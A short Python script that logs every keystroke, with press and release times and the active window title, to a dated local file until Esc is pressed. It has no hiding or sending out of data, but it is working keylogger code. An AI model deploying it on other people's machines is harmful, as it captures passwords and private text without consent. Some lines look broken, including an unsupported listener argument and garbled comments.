import logging
import win32gui
from datetime import datetime
from pynput import keyboard
Current_Date_Formatted = datetime.today().strftime('%d%m%Y')

log_dir = r"deata\\"
logging.basicConfig(filename=(log_dir + Current_Date_Formatted+"keyLog.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

keydic = {}


def current_app():
    w = win32gui 
    q = w.GetWindowText(w.GetForegroundWindow())
    return q


def on_press(key):
    keydic[str(key)] = datetime.now().strftime(' %H:%M:%S.%f')


def on_release(key):

    if str(key) in keydic.keys():
        release = datetime.now().strftime('%H:%M:%S.%f')
        logging.info('key: {}, pressed: {}, released {}, app {}'.format(
            key, keydic[str(key)], release, str(current_app())))


    if key == keyboard.Key.esc:
        # Stop listener F
        return False


# Collect events untilaaaaaa releasssedsss
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release, current_app=current_app) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release, current_app=current_app)
listener.start()